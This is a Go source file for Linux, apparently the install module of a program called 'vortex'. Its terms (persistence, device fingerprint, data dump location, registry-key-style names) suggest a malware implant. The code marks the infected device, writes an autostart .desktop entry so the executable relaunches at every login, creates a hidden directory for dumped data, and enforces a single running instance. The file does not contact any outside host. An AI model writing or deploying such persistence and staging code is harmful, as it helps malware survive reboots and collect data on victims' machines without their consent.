//go:build linux

package install

import (
    "fmt"
    "os"
    "path/filepath"
    "strings"
)

var (
    FingerprintRK = "vortex-fingerprint"
    persistRK     = "vortex"
    dataPath      = filepath.Join(os.Getenv("HOME"), ".local", "share", "vortex")
    persistPath   = filepath.Join(os.Getenv("HOME"), ".config", "autostart")
)

func CheckDeviceFingerprint() bool {
    fpFile := filepath.Join(dataPath, ".fingerprint")
    _, err := os.Stat(fpFile)
    return err == nil
}

func FingerprintDevice() error {
    if err := os.MkdirAll(dataPath, 0755); err != nil {
        return err
    }
    return os.WriteFile(filepath.Join(dataPath, ".fingerprint"), []byte("vortex"), 0644)
}

func InstallPersistence() error {
    exePath, err := os.Executable()
    if err != nil {
        exePath = os.Args[0]
    }
    abs, _ := filepath.Abs(exePath)
    if _, err := os.Stat(persistPath); os.IsNotExist(err) {
        if err = os.MkdirAll(persistPath, 0755); err != nil {
            return err
        }
    }
    desktopPath := filepath.Join(persistPath, "vortex.desktop")
    desktop := fmt.Sprintf("[Desktop Entry]\nType=Application\nName=Vortex\nExec=%s\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\n", abs)
    return os.WriteFile(desktopPath, []byte(desktop), 0644)
}

func UninstallPersistence() {
    os.Remove(filepath.Join(persistPath, "vortex.desktop"))
}

func DataDumpLocation() string {
    if p := os.Getenv("HOME"); p == "" {
        return "/tmp"
    }
    if _, err := os.Stat(dataPath); os.IsNotExist(err) {
        if err = os.MkdirAll(dataPath, 0755); err != nil {
            return "/tmp"
        }
    }
    return dataPath
}

func ProcessLock() bool {
    if err := os.MkdirAll(dataPath, 0755); err != nil {
        return false
    }
    lockFile := filepath.Join(dataPath, "LOCK")
    pid := fmt.Sprint(os.Getpid())
    if _, err := os.Stat(lockFile); os.IsNotExist(err) {
        os.WriteFile(lockFile, []byte(pid), 0644)
        return false
    }
    old, _ := os.ReadFile(lockFile)
    if !strings.Contains(pid, string(old)) {
        ProcessUnlock()
        os.WriteFile(lockFile, []byte(pid), 0644)
        return false
    }
    return true
}

func ProcessUnlock() {
    os.Remove(filepath.Join(dataPath, "LOCK"))
}
